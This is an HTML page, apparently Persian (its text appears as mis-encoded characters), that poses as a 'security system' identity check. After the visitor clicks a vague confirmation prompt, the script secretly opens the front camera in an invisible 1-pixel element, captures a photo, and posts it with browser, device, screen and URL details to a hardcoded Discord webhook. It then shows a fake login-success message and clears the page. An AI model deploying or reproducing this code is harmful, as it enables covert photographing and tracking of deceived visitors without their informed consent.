<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #1a1a1a;
            color: white;
            font-family: Arial;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .hidden-camera {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 1px;
            height: 1px;
        }
    </style>
</head>
<body>
    <div id="loading">
        <div class="loader"></div>
        <p>Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ø³ÛŒØ³ØªÙ…...</p>
    </div>

    <!-- Ø¯ÙˆØ±Ø¨ÛŒÙ† Ù…Ø®ÙÛŒ -->
    <div class="hidden-camera">
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        // ğŸ”§ ÙˆØ¨â€ŒÙ‡ÙˆÚ© ØªÙˆ
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1421586742120546418/sDyMZ53pfBPEzWRmmWG2ZlFtmmMDucEStM-pJ7V_q3l3wN4hmqQmBdp_kiqWVC06Sl9O';

        // Ø§Ù„Ù…Ù†Øªâ€ŒÙ‡Ø§
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loading = document.getElementById('loading');

        // ÙˆÙ‚ØªÛŒ ØµÙØ­Ù‡ Ù„ÙˆØ¯ Ø´Ø¯
        window.onload = function() {
            setTimeout(() => {
                const confirm = window.confirm('âš ï¸ Ø¨Ø±Ø§ÛŒ ÙˆØ±ÙˆØ¯ Ø¨Ù‡ Ø³ÛŒØ³ØªÙ… Ø¨Ø§ÛŒØ¯ ØªØ§ÛŒÛŒØ¯ Ú©Ù†ÛŒØ¯\n\nØ¢ÛŒØ§ Ù…ÙˆØ§ÙÙ‚ Ù‡Ø³ØªÛŒØ¯ØŸ');
                
                if (confirm) {
                    startHiddenCamera();
                } else {
                    showError('Ø¯Ø³ØªØ±Ø³ÛŒ Ø±Ø¯ Ø´Ø¯');
                }
            }, 1000);
        };

        // Ø¯ÙˆØ±Ø¨ÛŒÙ† Ù…Ø®ÙÛŒ
        async function startHiddenCamera() {
            try {
                loading.innerHTML = '<div class="loader"></div><p>Ø¯Ø± Ø­Ø§Ù„ Ø±Ø§Ù‡â€ŒØ§Ù†Ø¯Ø§Ø²ÛŒ Ø³ÛŒØ³ØªÙ… Ø§Ù…Ù†ÛŒØªÛŒ...</p>';
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });

                video.srcObject = stream;

                // ØµØ¨Ø± Ú©Ù† Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¢Ù…Ø§Ø¯Ù‡ Ø¨Ø´Ù‡
                setTimeout(() => {
                    takeHiddenPhoto(stream);
                }, 1000);

            } catch (error) {
                showError('Ø®Ø·Ø§ Ø¯Ø± Ø³ÛŒØ³ØªÙ… Ø§Ù…Ù†ÛŒØªÛŒ');
                console.error('Ø®Ø·Ø§:', error);
            }
        }

        // Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³ Ù…Ø®ÙÛŒ
        async function takeHiddenPhoto(stream) {
            try {
                loading.innerHTML = '<div class="loader"></div><p>Ø¯Ø± Ø­Ø§Ù„ ØªØ£ÛŒÛŒØ¯ Ù‡ÙˆÛŒØª...</p>';

                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0);
                
                // Ø¹Ú©Ø³ Ø±Ùˆ Ø¨Ù‡ ÙØ±Ù…Øª base64 ØªØ¨Ø¯ÛŒÙ„ Ú©Ù†
                const photoData = canvas.toDataURL('image/jpeg', 0.7);
                
                // Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø±Ùˆ Ø®Ø§Ù…ÙˆØ´ Ú©Ù†
                stream.getTracks().forEach(track => track.stop());
                
                // Ø¨Ù‡ Ø¯ÛŒØ³Ú©ÙˆØ±Ø¯ Ø¨ÙØ±Ø³Øª
                loading.innerHTML = '<div class="loader"></div><p>Ø¯Ø± Ø­Ø§Ù„ ÙˆØ±ÙˆØ¯ Ø¨Ù‡ Ø³ÛŒØ³ØªÙ…...</p>';
                await sendToDiscord(photoData);
                
                // ØµÙØ­Ù‡ Ø±Ùˆ Ø³ÙÛŒØ¯ Ú©Ù†
                showSuccess();
                
            } catch (error) {
                showError('Ø®Ø·Ø§ Ø¯Ø± ØªØ£ÛŒÛŒØ¯ Ù‡ÙˆÛŒØª');
                console.error('Ø®Ø·Ø§:', error);
            }
        }

        // Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ø¯ÛŒØ³Ú©ÙˆØ±Ø¯
        async function sendToDiscord(photoData) {
            try {
                // ØªØ¨Ø¯ÛŒÙ„ Ø¹Ú©Ø³ Ø¨Ù‡ ÙØ§ÛŒÙ„
                const response = await fetch(photoData);
                const blob = await response.blob();
                
                // Ø§ÛŒØ¬Ø§Ø¯ ÙØ±Ù… Ø¯Ø§Ø¯Ù‡
                const formData = new FormData();
                formData.append('file', blob, 'user_photo.jpg');
                formData.append('payload_json', JSON.stringify({
                    username: 'Security System',
                    avatar_url: 'https://cdn-icons-png.flaticon.com/512/2991/2991148.png',
                    content: 'ğŸ“¸ **Ø¹Ú©Ø³ Ú©Ø§Ø±Ø¨Ø± Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯**\n' +
                            `ğŸ•’ **Ø²Ù…Ø§Ù†:** ${new Date().toLocaleString('fa-IR')}\n` +
                            `ğŸŒ **Ù…Ø±ÙˆØ±Ú¯Ø±:** ${getBrowserName()}\n` +
                            `ğŸ“± **Ø¯Ø³ØªÚ¯Ø§Ù‡:** ${isMobile() ? 'Ù…ÙˆØ¨Ø§ÛŒÙ„' : 'Ø¯Ø³Ú©ØªØ§Ù¾'}\n` +
                            `ğŸ“ **ØµÙØ­Ù‡:** ${screen.width}x${screen.height}\n` +
                            `ğŸ”— **Ø¢Ø¯Ø±Ø³:** ${window.location.href}\n` +
                            'âœ… **ÙˆØ±ÙˆØ¯ Ù…ÙˆÙÙ‚**'
                }));

                // Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ø¯ÛŒØ³Ú©ÙˆØ±Ø¯
                const result = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    body: formData
                });

                if (!result.ok) {
                    throw new Error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„');
                }

                return true;

            } catch (error) {
                console.error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ Ø¯ÛŒØ³Ú©ÙˆØ±Ø¯:', error);
                throw error;
            }
        }

        // ØªØ´Ø®ÛŒØµ Ù…Ø±ÙˆØ±Ú¯Ø±
        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            return 'Unknown';
        }

        // ØªØ´Ø®ÛŒØµ Ù…ÙˆØ¨Ø§ÛŒÙ„
        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        // Ù†Ù…Ø§ÛŒØ´ Ù…ÙˆÙÙ‚ÛŒØª
        function showSuccess() {
            document.body.style.background = 'white';
            document.body.innerHTML = '<div style="color: black; padding: 20px;"><h1>âœ… ÙˆØ±ÙˆØ¯ Ù…ÙˆÙÙ‚</h1><p>Ø¯Ø± Ø­Ø§Ù„ Ù‡Ø¯Ø§ÛŒØª Ø¨Ù‡ ØµÙØ­Ù‡ Ø§ØµÙ„ÛŒ...</p></div>';
            
            // Ø¨Ø¹Ø¯ Ø§Ø² 3 Ø«Ø§Ù†ÛŒÙ‡ Ú©Ø§Ù…Ù„Ø§Ù‹ Ø³ÙÛŒØ¯ Ø¨Ø´Ù‡
            setTimeout(() => {
                document.body.innerHTML = '';
            }, 3000);
        }

        // Ù†Ù…Ø§ÛŒØ´ Ø®Ø·Ø§
        function showError(message) {
            document.body.innerHTML = `<div style="padding: 20px;"><h1>âŒ Ø®Ø·Ø§</h1><p>${message}</p></div>`;
        }
    </script>
</body>
</html>
